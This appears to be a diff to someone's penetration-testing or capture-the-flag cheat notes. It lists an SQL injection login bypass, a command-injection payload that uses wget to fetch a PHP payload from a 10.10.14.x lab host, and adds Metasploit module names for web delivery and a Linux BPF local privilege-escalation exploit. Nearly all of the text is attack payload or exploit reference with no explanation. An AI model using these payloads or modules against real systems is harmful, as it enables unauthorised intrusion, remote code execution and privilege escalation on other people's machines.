@@ -1,3 +1,7 @@
 ' or 1=1#
 
 ;wget 10.10.14.20:9000/payload.php
+
+msf use exploit/multi/script/web_delivery
+
+exploit/linux/local/bpf_sign_extension_priv_esc:
